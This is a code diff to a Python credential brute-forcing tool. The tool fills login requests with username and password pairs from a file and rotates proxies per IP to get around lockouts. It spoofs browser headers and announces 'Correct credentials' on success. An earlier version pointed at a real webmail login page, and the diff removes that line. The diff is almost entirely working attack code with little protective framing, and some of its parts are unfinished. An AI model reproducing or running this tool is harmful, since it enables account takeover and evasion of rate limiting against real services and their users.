@@ -3,7 +3,6 @@ import sys, json, os, re
 from packages.utils import (
     collect_input_args,
     validate_input_args,
-    unpack_variables_from_json,
 )
 import urllib.request, urllib.error, urllib.response, urllib.parse
 from packages.config import *
@@ -26,76 +25,36 @@ class Bruteforcer:
     def __init__(
         self,
         url,
+        headers_file,
         data_scheme_file_raw,
         credentials_file_raw,
+        fail_url_pattern,
         proxies_file_raw,
         attemps_per_ip,
     ) -> None:
-        def is_empty(input_file, file_name):
-            if not input_file:
-                print(f"File: `{file_name}` is empty! Adios!")
-                return True
-            return False
-
-        def validate_credentials_file(data_scheme, credentials_file):
-            # jeżeli zmienna jest duplikowana to i tak zmieniane są wszystkie na raz
-            variables_to_injection = list(
-                dict.fromkeys(re.findall("\$\{[a-zA-Z]+}", data_scheme))
-            )
-            len_variables_to_injection = len(variables_to_injection)
-            credentials = []
-            fields_cnt = credentials_file[0].count(":") + 1
-            if fields_cnt > len_variables_to_injection:
-                print(
-                    f"In credentials file is `{fields_cnt}` fields, and it's more than is needed in API data scheme (`{len_variables_to_injection}`)! I'll only use the first `{len_variables_to_injection}` columns from the credentials file"
-                )
-            for line in credentials_file:
-                # pomija puste linijki
-                line = line.rstrip()
-                if line.strip():
-                    current_fields_cnt = line.count(":") + 1
-                    # debug
-                    # print(
-                    #     f"Fields in line `{line}`credentials file: `{current_fields_cnt}`, Variables in your data to injection file: {len(variables_to_injection)}"
-                    # )
-                    if current_fields_cnt == 0:
-                        continue
-                    elif current_fields_cnt != fields_cnt:
-                        print(
-                            f"Line `{line.rstrip()}` differs than other lines in credentials file"
-                        )
-                        sys.exit(-1)
-                    elif current_fields_cnt >= len_variables_to_injection:
-                        credentials.append(
-                            tuple(line.split(":")[i] for i in range(fields_cnt))
-                        )
-                    else:
-                        print(
-                            "Match the number of columns in credential file to the number of variables in the text file with API data scheme"
-                        )
-                        sys.exit(-1)
-                else:
-                    # warning
-                    print("An empty line in credentials file. Skipped!")
-            return variables_to_injection, credentials
-
-        self.url = url
-        parse_url = urllib.parse.urlparse(self.url)
-        self.fail_url = ""
+        parse_url = urllib.parse.urlparse(url)
         self.host = "{uri.scheme}://{uri.netloc}/".format(uri=parse_url)
+        with urllib.request.urlopen(self.host) as response:
+            if response.code in [200, 201]:
+                self.url = url
+        self.fail_url = fail_url_pattern
+        self.headers = {}
+        if headers_file:
+            self.headers = self.__collect_headers__(headers_file)
+
         with open(data_scheme_file_raw, "r") as data_scheme_file:
             self.data_scheme = data_scheme_file.read().rstrip()
-            if is_empty(self.data_scheme, data_scheme_file_raw):
+            if self.__is_file_empty__(self.data_scheme, data_scheme_file_raw):
                 sys.exit(-1)
         # print(len(re.findall("\$\{(\w)+}", self.data_scheme)))
         with open(credentials_file_raw) as credentials_file:
             credentials_list = credentials_file.readlines()
-            if is_empty(credentials_list, credentials_file_raw):
+            if self.__is_file_empty__(credentials_list, credentials_file_raw):
                 sys.exit(-1)
             (
                 self.variables_to_injection,
                 self.credentials_list,
-            ) = validate_credentials_file(self.data_scheme, credentials_list)
+            ) = self.__validate_credentials_file__(self.data_scheme, credentials_list)
         self.attemps_per_ip = attemps_per_ip
         # TODO error
         if proxies_file_raw:
@@ -114,6 +73,95 @@ class Bruteforcer:
                         )
         else:
             self.proxies = []
+
+    def __is_file_empty__(self, input_file, file_name):
+        if not input_file:
+            print(f"File: `{file_name}` is empty! Adios!")
+            return True
+        return False
+
+    def __validate_credentials_file__(self, data_scheme, credentials_file):
+        # jeżeli zmienna jest duplikowana to i tak zmieniane są wszystkie na raz
+        variables_to_injection = list(
+            dict.fromkeys(re.findall("\$\{[a-zA-Z]+}", data_scheme))
+        )
+        len_variables_to_injection = len(variables_to_injection)
+        credentials = []
+        fields_cnt = credentials_file[0].count(":") + 1
+        if fields_cnt > len_variables_to_injection:
+            print(
+                f"In credentials file is `{fields_cnt}` fields, and it's more than is needed in API data scheme (`{len_variables_to_injection}`)! I'll only use the first `{len_variables_to_injection}` columns from the credentials file"
+            )
+        for line in credentials_file:
+            # pomija puste linijki
+            line = line.rstrip()
+            if line.strip():
+                current_fields_cnt = line.count(":") + 1
+                # debug
+                # print(
+                #     f"Fields in line `{line}`credentials file: `{current_fields_cnt}`, Variables in your data to injection file: {len(variables_to_injection)}"
+                # )
+                if current_fields_cnt == 0:
+                    continue
+                elif current_fields_cnt != fields_cnt:
+                    print(
+                        f"Line `{line.rstrip()}` differs than other lines in credentials file"
+                    )
+                    sys.exit(-1)
+                elif current_fields_cnt >= len_variables_to_injection:
+                    credentials.append(
+                        tuple(line.split(":")[i] for i in range(fields_cnt))
+                    )
+                else:
+                    print(
+                        "Match the number of columns in credential file to the number of variables in the text file with API data scheme"
+                    )
+                    sys.exit(-1)
+            else:
+                # warning
+                print("An empty line in credentials file. Skipped!")
+        return variables_to_injection, credentials
+
+    def __collect_headers__(self, headers_file_raw):
+        headers_dict = {}
+        with open(headers_file_raw) as headers_file:
+
+            if ".json" in headers_file_raw:
+                try:
+                    headers_dict = json.load(headers_file)
+                except Exception as e:
+                    print(e)
+            else:
+                headers_list_raw = list(headers_file.readlines())
+                headers_list_raw_len = len(headers_list_raw)
+                current_separator = ""
+                for separator in [": ", ",", ";", "; "]:  # to config
+                    if (
+                        len(
+                            [
+                                header
+                                for header in headers_list_raw
+                                if separator in header
+                            ]
+                        )
+                        == headers_list_raw_len
+                    ):
+                        current_separator = separator
+                        break
+                if not current_separator:
+                    print("Unknown separator! Please give me correct headers_file")
+                    # continue without header Y or N?
+                    sys.exit(-1)
+                for header in headers_list_raw:
+                    header = str(header).replace('"', "").replace("'", "")
+                    headers_dict[header.split(current_separator)[0]] = header.split(
+                        current_separator
+                    )[1].strip()
+        return headers_dict
+
+    def __add_headers__(self):
+        self.headers_file
+        pass
 
     def perform_bruteforce(self):
         def control_the_proxy_rotation(index, data_to_post):
@@ -189,7 +237,6 @@ class Bruteforcer:
             proxy_handler,
         )
         opener.addheaders = [("User-agent", "Mozilla/5.0")]
-        opener.open("https://konto.onet.pl/")
         urllib.request.install_opener(opener)
         request = urllib.request.Request(self.url, data=data_bytes)
         with urllib.request.urlopen(request, timeout=10) as response:
@@ -206,26 +253,28 @@ class Bruteforcer:
         # opener.addheaders = [("User-agent", "Mozilla/5.0")]
         # opener.addheaders = [("Content-Type", "application/x-www-form-urlencoded")]
         opener.addheaders = [("Referer", self.host)]
-        # opener.open("https://konto.onet.pl")
+        if self.headers:
+            for key, value in self.headers.items():
+                opener.addheaders = [(key, value)]
         urllib.request.install_opener(opener)
         request = urllib.request.Request(self.url, data=data_bytes)
         with urllib.request.urlopen(request, timeout=10) as response:
-            print(response.status)
+            # print(response.status)
             redirects = redirect_handler.get_redirects()
-            print(redirects)
+            # print(redirects)
             is_fail_url_match = True
             if redirects and self.fail_url:
                 is_fail_url_match = (
                     len([url for url in redirects if self.fail_url in url]) > 0
                 )
-                print(is_fail_url_match)
             elif redirects and not self.fail_url:
                 is_fail_url_match = True  # ewidentnue
             elif not redirects:
                 is_fail_url_match = False
             # print(response.read())
             if response.code in [200, 201] and not is_fail_url_match:
-                print(f"Correct credentials `{data_bytes}`")
+                current_credentials = data_bytes.decode("utf-8")
+                print(f"Correct credentials `{current_credentials}`")
                 sys.exit(0)
             else:
                 print("[-] Incorrect credentials [-]")
@@ -235,7 +284,26 @@ parser = argparse.ArgumentParser()
 args = collect_input_args(parser)
 validate_input_args(args)
 
+# try:
+#     bruteforce_tool = Bruteforcer(
+#         args.url,
+#         args.headers,
+#         args.data_scheme,
+#         args.credentials_file,
+#         args.fail_url,
+#         args.proxies,
+#         args.attemps_per_ip,
+#     )
+#     bruteforce_tool.perform_bruteforce()
+# except Exception as e:
+#     print(e)
 bruteforce_tool = Bruteforcer(
-    args.url, args.data_scheme, args.credentials_file, args.proxies, args.attemps_per_ip
+    args.url,
+    args.headers,
+    args.data_scheme,
+    args.credentials_file,
+    args.fail_url,
+    args.proxies,
+    args.attemps_per_ip,
 )
 bruteforce_tool.perform_bruteforce()
